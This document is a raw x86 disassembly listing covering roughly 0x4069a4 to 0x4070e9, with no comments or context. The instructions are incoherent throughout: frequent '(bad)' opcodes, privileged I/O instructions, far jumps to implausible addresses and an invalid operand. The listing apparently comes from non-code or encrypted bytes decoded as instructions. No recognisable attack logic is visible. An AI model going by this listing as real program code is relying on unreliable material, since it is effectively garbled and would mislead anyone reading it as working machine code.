  4069a4:	mov    eax,ds:0x7caf9d4c
  4069a9:	inc    ecx
  4069aa:	xchg   ebx,eax
  4069ab:	enter  0x2b16,0x1d
  4069af:	loopne 0x406a2b
  4069b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069b2:	hlt    
  4069b3:	(bad)  
  4069b4:	loop   0x40694d
  4069b6:	cld    
  4069b7:	add    BYTE PTR [esp+ecx*8+0x5e],0xea
  4069bc:	jg     0x406a02
  4069be:	pop    edx
  4069bf:	xchg   ecx,eax
  4069c0:	and    al,BYTE PTR [esi]
  4069c2:	dec    esp
  4069c3:	ins    BYTE PTR es:[edi],dx
  4069c4:	pop    es
  4069c5:	outs   dx,BYTE PTR ds:[esi]
  4069c6:	mov    sp,0x39d8
  4069ca:	int    0x33
  4069cc:	jl     0x406987
  4069ce:	xchg   BYTE PTR [ebp+0x78],ah
  4069d1:	or     ah,al
  4069d3:	popa   
  4069d4:	pop    ecx
  4069d5:	sahf   
  4069d6:	xlat   BYTE PTR ds:[ebx]
  4069d7:	sub    al,0x3a
  4069d9:	lds    ebx,FWORD PTR [ebx]
  4069db:	fimul  DWORD PTR [eax-0x19d97f1d]
  4069e1:	inc    eax
  4069e2:	shr    BYTE PTR [ebx-0x63],0x15
  4069e6:	es jg  0x406a1b
  4069e9:	push   ecx
  4069ea:	mov    esi,DWORD PTR [edi]
  4069ec:	fst    DWORD PTR [ecx]
  4069ee:	(bad)  
  4069ef:	mov    edi,0x319f43e1
  4069f4:	or     ecx,0x6b18b29d
  4069fa:	retf   
  4069fb:	int3   
  4069fc:	bound  esp,QWORD PTR [edx-0x4]
  4069ff:	xchg   ecx,eax
  406a00:	dec    esi
  406a01:	push   esp
  406a02:	jbe    0x4069d2
  406a04:	or     DWORD PTR [edx+edx*4-0x62],ebx
  406a08:	div    BYTE PTR [esi+0x49]
  406a0b:	cmp    esp,eax
  406a0d:	jb     0x4069fa
  406a0f:	out    0x77,al
  406a11:	popa   
  406a12:	or     eax,0x99371a66
  406a17:	fistp  WORD PTR [edi+eiz*2+0x5c]
  406a1b:	stos   BYTE PTR es:[edi],al
  406a1c:	inc    ebp
  406a1d:	pop    esi
  406a1e:	xchg   edi,eax
  406a1f:	xchg   ebx,eax
  406a20:	rcl    DWORD PTR [esi-0x35],1
  406a23:	cmp    BYTE PTR [esi],0x1a
  406a26:	mov    al,ds:0x43fc9740
  406a2b:	push   ss
  406a2c:	xchg   esp,eax
  406a2d:	pop    edx
  406a2e:	out    dx,eax
  406a2f:	xchg   cl,bl
  406a31:	lock mov edx,0xc02b1aca
  406a37:	jb     0x406a80
  406a39:	adc    bl,BYTE PTR [ebx-0x38bad9e2]
  406a3f:	or     al,0x38
  406a41:	aad    0x71
  406a43:	lock in eax,dx
  406a45:	out    dx,al
  406a46:	cmc    
  406a47:	lock outs dx,BYTE PTR ds:[esi]
  406a49:	pop    edi
  406a4a:	mov    cs,esi
  406a4c:	sub    BYTE PTR [esi+0x31039282],cl
  406a52:	add    DWORD PTR [ebx+0x13],esi
  406a55:	mov    ds,WORD PTR [ecx+0x3385cd80]
  406a5b:	daa    
  406a5c:	cmp    bl,cl
  406a5e:	mov    cl,0xae
  406a60:	loop   0x406aa9
  406a62:	push   esi
  406a63:	nop
  406a64:	jmp    0x406a3d
  406a66:	mov    ebx,0x21140511
  406a6b:	call   0xb58eae6f
  406a70:	xor    eax,0x8b4feadb
  406a75:	xchg   esi,eax
  406a76:	seta   BYTE PTR [esi+0x39]
  406a7a:	xor    al,0xfe
  406a7c:	jge    0x406acf
  406a7e:	jge    0x406a63
  406a80:	xlat   BYTE PTR ds:[ebx]
  406a81:	sbb    dl,BYTE PTR [edx]
  406a83:	out    dx,eax
  406a84:	adc    BYTE PTR [esi],dh
  406a86:	push   cs
  406a87:	push   esi
  406a88:	mov    eax,ds:0x9465a5f7
  406a8d:	scas   al,BYTE PTR es:[edi]
  406a8e:	pop    es
  406a8f:	xchg   ebx,eax
  406a90:	pop    esi
  406a91:	js     0x406afb
  406a93:	cmp    DWORD PTR [ecx],eax
  406a95:	pop    ebx
  406a96:	mov    esi,0xc6939981
  406a9b:	pop    ds
  406a9c:	pop    ss
  406a9d:	mov    bh,0x7
  406a9f:	xchg   ecx,eax
  406aa0:	into   
  406aa1:	sub    al,0xa9
  406aa3:	push   es
  406aa4:	xor    al,0xc8
  406aa6:	xchg   ebx,ebp
  406aa8:	mov    WORD PTR [esi],es
  406aaa:	mov    DWORD PTR [edx-0xf],edx
  406aad:	int3   
  406aae:	pop    ebx
  406aaf:	sub    BYTE PTR [esi+esi*4],bh
  406ab2:	pop    esp
  406ab3:	mov    edi,0x47462aed
  406ab8:	sbb    al,0xa1
  406aba:	dec    eax
  406abb:	and    al,0x6b
  406abd:	inc    esi
  406abe:	adc    eax,0xea1f9d36
  406ac3:	clc    
  406ac4:	ins    BYTE PTR es:[edi],dx
  406ac5:	inc    ebx
  406ac6:	aad    0x78
  406ac8:	dec    ebp
  406ac9:	jae    0x406ac6
  406acb:	mov    esi,0xfdf138ed
  406ad0:	sar    BYTE PTR [ebx],0xa7
  406ad3:	sub    ebp,eax
  406ad5:	sub    al,BYTE PTR [esi-0x16]
  406ad8:	data16 jge 0x406ae9
  406adb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406adc:	dec    eax
  406add:	fisubr DWORD PTR [edi-0x32]
  406ae0:	dec    edi
  406ae1:	ins    DWORD PTR es:[edi],dx
  406ae2:	stos   BYTE PTR es:[edi],al
  406ae3:	jae    0x406b1a
  406ae5:	stos   BYTE PTR es:[edi],al
  406ae6:	xor    al,0xba
  406ae8:	scas   al,BYTE PTR es:[edi]
  406ae9:	jo     0x406aff
  406aeb:	loopne 0x406b19
  406aed:	pushf  
  406aee:	lods   eax,DWORD PTR ds:[esi]
  406aef:	popf   
  406af0:	rcl    esi,0x44
  406af3:	jo     0x406aea
  406af5:	pop    ss
  406af6:	shl    DWORD PTR [edx+eax*2-0x65b20018],1
  406afd:	fwait
  406afe:	mov    BYTE PTR [edi],cl
  406b00:	mov    ch,0x5a
  406b02:	mov    dh,0x26
  406b04:	aam    0xd6
  406b06:	jns    0x406a9a
  406b08:	out    dx,eax
  406b09:	xlat   BYTE PTR ds:[ebx]
  406b0a:	push   edx
  406b0b:	sbb    bl,dl
  406b0d:	fmul   DWORD PTR [edx]
  406b0f:	stos   BYTE PTR es:[edi],al
  406b10:	jle    0x406aac
  406b12:	loop   0x406b32
  406b14:	xor    ch,dl
  406b16:	or     ebx,DWORD PTR [ecx-0x44]
  406b19:	sub    BYTE PTR [ebx-0x2b8660bf],ah
  406b1f:	adc    dh,dl
  406b21:	sbb    DWORD PTR [edx],0x1ca03c8c
  406b27:	in     al,0xbb
  406b29:	xor    edi,DWORD PTR [edx]
  406b2b:	outs   dx,DWORD PTR ds:[esi]
  406b2c:	pop    esi
  406b2d:	jp     0x406b3b
  406b2f:	mov    edx,0x59bb0838
  406b34:	inc    eax
  406b35:	or     eax,0x315c50bf
  406b3a:	lock loope 0x406ae9
  406b3d:	inc    ecx
  406b3e:	push   es
  406b3f:	mov    ch,BYTE PTR [ebx+0x6e62985a]
  406b45:	and    ebx,0xd49f2552
  406b4b:	pusha  
  406b4c:	xchg   ebp,eax
  406b4d:	mov    cl,BYTE PTR [ebp+0x4450979]
  406b53:	ret    
  406b54:	xor    bh,BYTE PTR [eax-0x7d]
  406b57:	xor    eax,0x53346662
  406b5c:	pop    ecx
  406b5d:	mov    ah,0xe5
  406b5f:	int    0xca
  406b61:	ds sub eax,0x59b30e01
  406b67:	in     eax,0xb5
  406b69:	mov    cl,0xf0
  406b6b:	adc    al,0xd2
  406b6d:	sbb    al,0x90
  406b6f:	mov    eax,ds:0xd4f8b9da
  406b74:	sti    
  406b75:	shr    DWORD PTR [edx-0x1f],1
  406b78:	or     BYTE PTR [ecx+0x1e],bl
  406b7b:	aaa    
  406b7c:	jns    0x406bf2
  406b7e:	add    DWORD PTR [edi+0x77b00039],edi
  406b84:	or     eax,0x43f1d146
  406b89:	xchg   edx,eax
  406b8a:	jbe    0x406b9a
  406b8c:	sub    al,BYTE PTR [ebx+0x2b78c852]
  406b92:	jb     0x406b60
  406b94:	aas    
  406b95:	sahf   
  406b96:	cdq    
  406b97:	pop    eax
  406b98:	test   al,0x61
  406b9a:	lods   eax,DWORD PTR ds:[esi]
  406b9b:	fcos   
  406b9d:	addr16 mov ds:0x8cfd,eax
  406ba1:	dec    ebx
  406ba2:	inc    eax
  406ba3:	dec    ebp
  406ba4:	add    eax,0xcd0dcbb
  406ba9:	or     al,0x67
  406bab:	and    edi,DWORD PTR [ebx+ebp*2]
  406bae:	js     0x406bc8
  406bb0:	lahf   
  406bb1:	jmp    0xd28097f6
  406bb6:	add    DWORD PTR [esi],ebp
  406bb8:	(bad)  
  406bb9:	or     ebp,DWORD PTR [edx+0x42]
  406bbc:	stos   DWORD PTR es:[edi],eax
  406bbd:	iret   
  406bbe:	and    BYTE PTR [edx+0x372e8931],0x6a
  406bc5:	jne    0x406b63
  406bc7:	push   0x8f3debc7
  406bcc:	jecxz  0x406c08
  406bce:	mov    bl,0xf6
  406bd0:	dec    di
  406bd2:	fisubr DWORD PTR [ebp+0x1e5afa3a]
  406bd8:	ficom  WORD PTR [esi]
  406bda:	inc    ebx
  406bdb:	cmp    eax,0xce018651
  406be0:	(bad)  
  406be2:	aam    0xe8
  406be4:	dec    ecx
  406be5:	mov    al,ds:0xc130f863
  406bea:	inc    ebx
  406beb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bec:	fdiv   QWORD PTR [ebp+0x1e]
  406bef:	data16 xchg dl,cl
  406bf2:	imul   edi,DWORD PTR [edi],0xffffffcb
  406bf5:	inc    esp
  406bf6:	imul   esi,DWORD PTR [ecx],0x7b
  406bf9:	pop    ss
  406bfa:	jb     0x406bde
  406bfc:	dec    ebx
  406bfd:	pop    edi
  406bfe:	cmp    ebp,esp
  406c00:	shr    DWORD PTR ds:[eax+0x65],1
  406c04:	jne    0x406bb3
  406c06:	repnz push ss
  406c08:	retf   0xd1a5
  406c0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c0c:	xor    esp,ecx
  406c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c0f:	outs   dx,BYTE PTR ds:[esi]
  406c10:	cs call 0x6247b141
  406c16:	out    dx,eax
  406c17:	push   edx
  406c18:	push   edx
  406c19:	rcr    bh,cl
  406c1b:	pop    edi
  406c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c1d:	ret    0x8185
  406c20:	cmp    ch,al
  406c22:	sbb    ah,cl
  406c24:	xchg   ecx,eax
  406c25:	data16 inc bx
  406c28:	jmp    0x406c03
  406c2a:	fcomp  QWORD PTR [edx+ebx*4-0x59]
  406c2e:	in     al,0x78
  406c30:	jmp    0xf56b988f
  406c35:	(bad)  
  406c36:	and    DWORD PTR [esi],esi
  406c38:	ss test eax,0x6739e06f
  406c3e:	push   ss
  406c3f:	dec    edi
  406c40:	stc    
  406c41:	inc    edi
  406c42:	ja     0x406c2a
  406c44:	das    
  406c45:	mov    edi,0x85b6e5c1
  406c4a:	cmp    ch,bl
  406c4c:	adc    DWORD PTR [ecx],ecx
  406c4e:	pop    ecx
  406c4f:	cmp    ecx,DWORD PTR [ebx+0x7334abdd]
  406c55:	xchg   ecx,eax
  406c56:	popa   
  406c57:	(bad)  
  406c58:	sub    ebx,DWORD PTR [edx]
  406c5a:	(bad)  
  406c5b:	bound  edi,QWORD PTR [edi-0x78]
  406c5e:	and    ch,bh
  406c60:	aaa    
  406c61:	xlat   BYTE PTR ds:[ebx]
  406c62:	rcr    BYTE PTR [esi],1
  406c64:	int3   
  406c65:	sub    eax,0x1d59fedd
  406c6a:	adc    ecx,esi
  406c6c:	rcl    BYTE PTR [edi+0x1f],cl
  406c6f:	dec    edx
  406c70:	xchg   edx,eax
  406c71:	in     eax,0x22
  406c73:	in     eax,0x0
  406c75:	ins    DWORD PTR es:[edi],dx
  406c76:	inc    esp
  406c77:	in     eax,0xf4
  406c79:	and    eax,0xa1e5905
  406c7e:	sbb    DWORD PTR [esi],edx
  406c80:	xchg   ebx,eax
  406c81:	pop    es
  406c82:	sub    ch,BYTE PTR [ebp+0x757a0fdd]
  406c88:	fbld   TBYTE PTR [esi-0x7b]
  406c8b:	pop    ebp
  406c8c:	adc    al,0x18
  406c8e:	sbb    DWORD PTR [edx-0x4a],ebp
  406c91:	inc    ecx
  406c92:	jl     0x406cee
  406c94:	cmp    ecx,esp
  406c96:	(bad)  
  406c97:	jo     0x406c45
  406c99:	jbe    0x406cb6
  406c9b:	cmp    al,cl
  406c9d:	sahf   
  406c9e:	rcl    DWORD PTR [ebx],0x62
  406ca1:	stos   BYTE PTR es:[edi],al
  406ca2:	mov    bh,0xbe
  406ca4:	adc    bh,BYTE PTR [eax]
  406ca6:	mov    ds:0x5c01203c,eax
  406cab:	sbb    DWORD PTR [eax-0x2f4e4ec2],0xffffff8b
  406cb2:	push   esp
  406cb3:	stc    
  406cb4:	nop
  406cb5:	xchg   ebp,eax
  406cb6:	mov    cl,BYTE PTR [edx-0x4d]
  406cb9:	not    DWORD PTR [ebp-0x17a6a1a8]
  406cbf:	loop   0x406d30
  406cc1:	or     BYTE PTR [edi],dh
  406cc3:	jae    0x406c4a
  406cc5:	xor    al,BYTE PTR [edx+ecx*8+0x75]
  406cc9:	xchg   ebp,eax
  406cca:	imul   ebx,DWORD PTR [ecx-0xb],0x32
  406cce:	push   edi
  406ccf:	(bad)  
  406cd0:	call   0x5e5a:0x5323abd4
  406cd7:	mov    ch,0xd6
  406cd9:	mov    ah,0x42
  406cdb:	lahf   
  406cdc:	pop    ss
  406cdd:	test   ebx,edx
  406cdf:	push   ds
  406ce0:	mov    ds:0xb07e15c4,al
  406ce5:	jmp    0xd5bd65c5
  406cea:	dec    edx
  406ceb:	(bad)  
  406cec:	sti    
  406ced:	sub    dh,BYTE PTR [esi]
  406cef:	lea    esp,[edi]
  406cf1:	into   
  406cf2:	or     bh,BYTE PTR [ecx+ebx*2]
  406cf5:	fs xchg edx,eax
  406cf7:	jae    0x406cdd
  406cf9:	nop
  406cfa:	xlat   BYTE PTR ds:[ebx]
  406cfb:	jmp    0xd2b7ff2e
  406d00:	mov    ecx,0xa7d37d8a
  406d05:	push   esp
  406d06:	jb     0x406c98
  406d08:	inc    eax
  406d09:	ins    DWORD PTR es:[edi],dx
  406d0a:	(bad)  
  406d0b:	test   al,0xc3
  406d0d:	test   BYTE PTR [esi],ah
  406d0f:	xor    cl,bl
  406d11:	ds jb  0x406ca9
  406d14:	ret    
  406d15:	test   BYTE PTR [ecx+0x1315c504],cl
  406d1b:	aaa    
  406d1c:	dec    edi
  406d1d:	inc    ebp
  406d1e:	imul   DWORD PTR [edx]
  406d20:	aas    
  406d21:	pop    esi
  406d22:	or     ebp,DWORD PTR [eax]
  406d24:	sbb    al,0x29
  406d26:	ret    
  406d27:	mov    ebx,0x34245c9e
  406d2c:	arpl   WORD PTR [edi],di
  406d2e:	jmp    0x406ccf
  406d30:	nop
  406d31:	jb     0x406d46
  406d33:	nop
  406d34:	adc    al,0xea
  406d36:	cli    
  406d37:	jmp    0x406da7
  406d39:	xchg   esp,eax
  406d3a:	jl     0x406d93
  406d3c:	pop    es
  406d3d:	aaa    
  406d3e:	jae    0x406dbf
  406d40:	xchg   ebp,eax
  406d41:	fiadd  DWORD PTR [edi]
  406d43:	cmp    al,BYTE PTR [ebx-0x40ddae2a]
  406d49:	sahf   
  406d4a:	or     al,BYTE PTR [esi]
  406d4c:	adc    edx,esp
  406d4e:	mov    BYTE PTR [ebx],bh
  406d50:	mov    ecx,0xe1b72c46
  406d55:	mov    esi,0x9fdde3bb
  406d5a:	(bad)  
  406d5b:	icebp  
  406d5c:	ficomp DWORD PTR [edi-0x5f2d4754]
  406d62:	xchg   BYTE PTR [ebx-0x9],cl
  406d65:	ins    BYTE PTR es:[edi],dx
  406d66:	(bad)  
  406d67:	std    
  406d68:	in     eax,dx
  406d69:	data16 xor BYTE PTR [ebx],ah
  406d6c:	mov    eax,ds:0x82efb22f
  406d71:	(bad)  
  406d72:	int    0x3d
  406d74:	inc    ecx
  406d75:	sbb    eax,0xaac192f6
  406d7a:	jecxz  0x406dd0
  406d7c:	mov    DWORD PTR [edi],eax
  406d7e:	mov    eax,ds:0x420986b7
  406d83:	test   al,0x84
  406d85:	push   es
  406d86:	sbb    ebx,DWORD PTR [edx]
  406d88:	mov    cl,0x71
  406d8a:	xor    DWORD PTR [esi+0x6],0x9122d4e2
  406d91:	mov    ?,esp
  406d93:	daa    
  406d94:	int    0x68
  406d96:	jmp    0x83fb:0x16e6d4a3
  406d9d:	bound  esp,QWORD PTR [esi+ebx*4]
  406da0:	leave  
  406da1:	xchg   esi,eax
  406da2:	pop    esp
  406da3:	vpshaw xmm6,xmm6,[ecx]
  406da8:	nop
  406da9:	inc    ecx
  406daa:	dec    esi
  406dab:	lea    ebx,[eax+edi*4+0x31]
  406daf:	mov    edx,0xd15a7990
  406db4:	sbb    bl,BYTE PTR [esi]
  406db6:	retf   
  406db7:	xor    BYTE PTR [edx+0x9],cl
  406dba:	lods   al,BYTE PTR ds:[esi]
  406dbb:	je     0x406d6b
  406dbd:	rcr    edi,cl
  406dbf:	outs   dx,BYTE PTR ds:[esi]
  406dc0:	pop    ecx
  406dc1:	push   esp
  406dc2:	xchg   BYTE PTR [ebx+0x0],bh
  406dc5:	push   ecx
  406dc6:	adc    bl,bl
  406dc8:	sub    ebx,DWORD PTR [eax+0x6681e782]
  406dce:	pop    ecx
  406dcf:	imul   esp,DWORD PTR [ecx-0x5f],0xfffffffc
  406dd3:	pop    ss
  406dd4:	mov    dh,0xc3
  406dd6:	repz int3 
  406dd8:	push   edx
  406dd9:	sub    BYTE PTR [esi+0x5f],bl
  406ddc:	xchg   ebp,eax
  406ddd:	dec    ebx
  406dde:	dec    edi
  406ddf:	dec    ecx
  406de0:	les    ebp,FWORD PTR ds:0x61922265
  406de6:	aam    0xe0
  406de8:	jl     0x406dbf
  406dea:	lods   al,BYTE PTR ds:[esi]
  406deb:	xchg   esp,eax
  406dec:	adc    ecx,ecx
  406dee:	sti    
  406def:	cs sbb eax,0xf5c18bf9
  406df5:	cmp    DWORD PTR [ebp-0x11],edi
  406df8:	js     0x406d9c
  406dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dfb:	xchg   DWORD PTR [ebx],eax
  406dfd:	or     DWORD PTR [ecx-0x2a],edi
  406e00:	xchg   ecx,eax
  406e01:	sub    al,BYTE PTR [edx]
  406e03:	sub    dh,bl
  406e05:	inc    esp
  406e06:	in     eax,dx
  406e07:	mov    edx,0x515ffbbc
  406e0c:	(bad)  
  406e0d:	mov    edx,0x834e37f6
  406e12:	arpl   WORD PTR [ecx-0x5cc0c41e],sp
  406e18:	test   DWORD PTR [edx],ecx
  406e1a:	mov    ecx,0xc66386e
  406e1f:	out    dx,al
  406e20:	inc    ecx
  406e21:	cmp    eax,0x8adf95f1
  406e26:	sti    
  406e27:	xor    DWORD PTR [edi-0x17d6784c],edi
  406e2d:	lahf   
  406e2e:	shl    BYTE PTR ds:0xd241b22e,0x44
  406e35:	and    al,0xf6
  406e37:	ror    BYTE PTR [ebx+0x77],1
  406e3a:	and    BYTE PTR [ebp-0x586357a6],ch
  406e40:	mov    al,0x97
  406e42:	mov    DWORD PTR cs:[ebp+0x215236dc],edi
  406e49:	loope  0x406e56
  406e4b:	aaa    
  406e4c:	xchg   edi,eax
  406e4d:	cmp    esp,0x6c
  406e50:	mov    esp,0x54fa570a
  406e55:	cmp    al,0xf9
  406e57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e58:	hlt    
  406e59:	cmp    al,0xa4
  406e5b:	mov    ds:0x16e17364,eax
  406e60:	aaa    
  406e61:	loopne 0x406e93
  406e63:	or     eax,0x2840a4fc
  406e68:	mov    eax,0x1b861a0
  406e6d:	mov    cs,WORD PTR [edi]
  406e6f:	add    eax,0x16b381bf
  406e74:	push   0x9f06d693
  406e79:	mov    ah,0xb4
  406e7b:	mov    al,ds:0x7b33616f
  406e80:	into   
  406e81:	(bad)  
  406e82:	adc    al,0x55
  406e84:	inc    eax
  406e85:	pusha  
  406e86:	jnp    0x406e99
  406e88:	dec    edx
  406e89:	rcr    eax,1
  406e8b:	cmp    DWORD PTR [edx],ebx
  406e8d:	mov    ch,0x44
  406e8f:	mov    edi,0x486ab86
  406e94:	retf   
  406e95:	popa   
  406e96:	es int 0xe2
  406e99:	out    dx,al
  406e9a:	rol    DWORD PTR [ebp-0x18],cl
  406e9d:	lahf   
  406e9e:	pop    edi
  406e9f:	fwait
  406ea0:	arpl   WORD PTR [eax+0xfa80fe5],bx
  406ea6:	jmp    0xaf37cecd
  406eab:	xor    ecx,DWORD PTR [edx]
  406ead:	fwait
  406eae:	shl    dh,cl
  406eb0:	xor    esp,DWORD PTR [ebx+ecx*8]
  406eb3:	dec    ebx
  406eb4:	mov    edx,0xb29d90d0
  406eb9:	sub    esp,ebx
  406ebb:	js     0x406f0d
  406ebd:	adc    DWORD PTR [edx+ebx*2+0x50],esp
  406ec1:	iret   
  406ec2:	(bad)  
  406ec3:	bound  esi,QWORD PTR [edx-0x56f7e529]
  406ec9:	sub    edx,edx
  406ecb:	mov    al,0x12
  406ecd:	es ret 0xd4d7
  406ed1:	scas   eax,DWORD PTR es:[edi]
  406ed2:	push   edi
  406ed3:	push   ebp
  406ed4:	mov    ds:0x209d82a6,eax
  406ed9:	cmp    ch,ah
  406edb:	sub    ah,BYTE PTR [ecx-0x31]
  406ede:	imul   ebp,DWORD PTR [esi],0xf28cbed3
  406ee4:	leave  
  406ee5:	push   ecx
  406ee6:	cs adc ecx,edi
  406ee9:	dec    eax
  406eea:	sbb    al,0x44
  406eec:	scas   eax,DWORD PTR es:[edi]
  406eed:	xor    eax,0x51bff161
  406ef2:	and    ch,BYTE PTR [ebx+0x3f]
  406ef5:	add    cl,al
  406ef7:	pop    es
  406ef8:	cmp    dl,BYTE PTR [esi-0x5]
  406efb:	inc    ebp
  406efc:	call   0x4e98:0x9073a3b8
  406f03:	xchg   ecx,eax
  406f04:	xor    eax,0xc82ceeb1
  406f09:	idiv   ebp
  406f0b:	or     DWORD PTR [ebx],edi
  406f0d:	inc    ecx
  406f0e:	ds inc edx
  406f10:	outs   dx,BYTE PTR ds:[esi]
  406f11:	xor    ebx,ecx
  406f13:	mov    al,ds:0xa81b350c
  406f18:	(bad)  
  406f19:	aam    0x5f
  406f1b:	jl     0x406f7e
  406f1d:	jl     0x406f2e
  406f1f:	jns    0x406f75
  406f21:	js     0x406f58
  406f23:	jb     0x406f08
  406f25:	rol    DWORD PTR [edx],0x7d
  406f28:	jnp    0x406ef8
  406f2a:	jnp    0x406eb8
  406f2c:	pop    esp
  406f2d:	mov    es,WORD PTR [eax]
  406f2f:	call   0xb2cf:0xa0f5beda
  406f36:	sub    ch,BYTE PTR [edx]
  406f38:	mov    ah,bl
  406f3a:	jl     0x406f50
  406f3c:	pusha  
  406f3d:	dec    eax
  406f3e:	push   edx
  406f3f:	les    eax,FWORD PTR [edi]
  406f41:	(bad)  
  406f42:	add    ah,BYTE PTR [ebp-0x1a]
  406f45:	xchg   ebp,eax
  406f46:	jecxz  0x406f8f
  406f48:	into   
  406f49:	in     eax,dx
  406f4a:	fist   DWORD PTR [edi-0x10b19010]
  406f50:	ret    0x889c
  406f53:	sti    
  406f54:	sub    DWORD PTR [esi+0xa1dad3d],edi
  406f5a:	imul   esi,DWORD PTR [esi-0x2],0x93a6cd8c
  406f61:	dec    ebx
  406f62:	cld    
  406f63:	pop    edi
  406f64:	div    DWORD PTR [ecx-0x2e]
  406f67:	dec    ecx
  406f68:	adc    DWORD PTR [ecx-0x1a],edi
  406f6b:	into   
  406f6c:	cmp    al,0x92
  406f6e:	arpl   WORD PTR [edi-0x485254c4],si
  406f74:	aaa    
  406f75:	mov    BYTE PTR [ebx+0x1e],al
  406f78:	push   eax
  406f79:	js     0x406f47
  406f7b:	loope  0x406fa5
  406f7d:	dec    esp
  406f7e:	or     eax,edx
  406f80:	dec    esi
  406f81:	push   ds
  406f82:	int    0x34
  406f84:	loopne 0x406fe7
  406f86:	mov    dh,BYTE PTR ds:0x6b009576
  406f8c:	test   BYTE PTR [edx-0x2a573767],ah
  406f92:	fs dec si
  406f95:	(bad)  
  406f97:	and    eax,0x759a1f66
  406f9c:	dec    ebp
  406f9d:	sbb    DWORD PTR [ebx-0xd85e4d4],edx
  406fa3:	mov    bh,0x20
  406fa5:	xor    BYTE PTR [ebp-0x27],ch
  406fa8:	in     eax,0xec
  406faa:	pop    ds
  406fab:	jmp    0xd77f:0x32903f1d
  406fb2:	dec    edx
  406fb3:	pop    ss
  406fb4:	mov    al,ds:0x39d5a5cd
  406fb9:	jecxz  0x406fad
  406fbb:	dec    edx
  406fbc:	adc    eax,0x409bc68e
  406fc1:	shr    BYTE PTR [eax*1+0x125e486a],1
  406fc8:	outs   dx,BYTE PTR ds:[esi]
  406fc9:	cmp    esi,DWORD PTR [esi+eiz*8+0x5d]
  406fcd:	jge    0x406f5a
  406fcf:	les    ebp,FWORD PTR [edx+0x20a86ea5]
  406fd5:	es leave 
  406fd7:	sbb    al,0x24
  406fd9:	push   eax
  406fda:	push   ebx
  406fdb:	arpl   WORD PTR [esi-0x50],bx
  406fde:	and    BYTE PTR [ebx-0x5e4a715b],dh
  406fe4:	xor    edi,DWORD PTR [edi]
  406fe6:	stc    
  406fe7:	rcl    DWORD PTR [ebx-0xf5afdde],cl
  406fed:	or     eax,0x2add6cf
  406ff2:	stos   BYTE PTR es:[edi],al
  406ff3:	cdq    
  406ff4:	mov    ecx,DWORD PTR [ecx+0x41]
  406ff7:	mov    bl,0x55
  406ff9:	cmp    eax,0x184dafde
  406ffe:	xor    cl,BYTE PTR [esi-0x4156cef]
  407004:	inc    edi
  407005:	mov    ch,0xd8
  407007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407008:	iret   
  407009:	nop
  40700a:	test   BYTE PTR [ebx],bl
  40700c:	push   eax
  40700d:	imul   eax,DWORD PTR [esi],0xffffff87
  407010:	leave  
  407011:	mov    bl,0x66
  407013:	dec    edi
  407014:	cmp    edx,edi
  407016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407017:	bound  eax,QWORD PTR [eax]
  407019:	add    DWORD PTR [edx+eiz*2],edi
  40701c:	adc    al,0x52
  40701e:	popf   
  40701f:	sbb    dl,BYTE PTR [ebp-0x750fc39c]
  407025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407026:	iret   
  407027:	sbb    DWORD PTR [ecx-0x34fbf740],0x16239cf4
  407031:	xchg   edi,eax
  407032:	cmp    al,0x16
  407034:	pop    ebx
  407035:	aas    
  407036:	in     eax,0xf9
  407038:	add    eax,0x2ffd6222
  40703d:	imul   ebx,eax,0xd4de5984
  407043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407044:	lods   eax,DWORD PTR ds:[esi]
  407045:	inc    ebx
  407046:	adc    eax,0x15357b0c
  40704b:	nop
  40704c:	pop    ds
  40704d:	and    DWORD PTR [eax],esi
  40704f:	sahf   
  407050:	(bad)  
  407051:	es out dx,al
  407053:	sbb    ebp,DWORD PTR [esi+0x2645af7]
  407059:	inc    ebp
  40705a:	xchg   edi,eax
  40705b:	bound  esp,QWORD PTR [edx+0x48]
  40705e:	sbb    ch,BYTE PTR [ecx-0x47e3450]
  407064:	push   DWORD PTR [ebx+0x39]
  407067:	xor    DWORD PTR [esp+ebp*4-0x72e78e09],edx
  40706e:	adc    BYTE PTR [esi+0x7a],ch
  407071:	mov    al,ds:0x5ef856e1
  407076:	mov    ebx,eax
  407078:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407079:	jnp    0x4070b2
  40707b:	push   0x68
  40707d:	xor    DWORD PTR [ebp-0x78],0xffffff89
  407081:	out    dx,al
  407082:	or     BYTE PTR [ecx+0x44],al
  407085:	sub    BYTE PTR [ebx+0x7a],dl
  407088:	mov    edx,0x76211d81
  40708d:	push   edx
  40708e:	ja     0x4070f7
  407090:	jp     0x40706f
  407092:	xchg   ebp,eax
  407093:	inc    edi
  407094:	push   edi
  407095:	addr16 popf 
  407097:	push   ecx
  407098:	ins    DWORD PTR es:[edi],dx
  407099:	mov    esi,0x10252e50
  40709e:	pusha  
  40709f:	inc    eax
  4070a0:	mov    ecx,0x9cc4dde3
  4070a5:	push   0x62d64d20
  4070aa:	das    
  4070ab:	jl     0x4070a9
  4070ad:	fstp   DWORD PTR [ecx+0x0]
  4070b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070b1:	loopne 0x40710d
  4070b3:	sahf   
  4070b4:	add    ecx,edi
  4070b6:	imul   esp,DWORD PTR [edx-0x49],0x94d1cbb5
  4070bd:	xchg   ebx,eax
  4070be:	(bad)
  4070c1:	arpl   WORD PTR [ecx+0x63],bp
  4070c4:	retf   0xa67b
  4070c7:	adc    al,0xc2
  4070c9:	push   ss
  4070ca:	je     0x407132
  4070cc:	xchg   ebx,eax
  4070cd:	test   BYTE PTR [edi+eiz*8-0x6a],ah
  4070d1:	jbe    0x407059
  4070d3:	adc    al,0x20
  4070d5:	jmp    0xe398:0x6ca1fbbc
  4070dc:	lods   al,BYTE PTR ds:[esi]
  4070dd:	lahf   
  4070de:	repz sbb BYTE PTR [ecx+0x66],0x23
  4070e3:	sub    eax,DWORD PTR [edi-0x3ef15b76]
  4070e9:	(bad)  
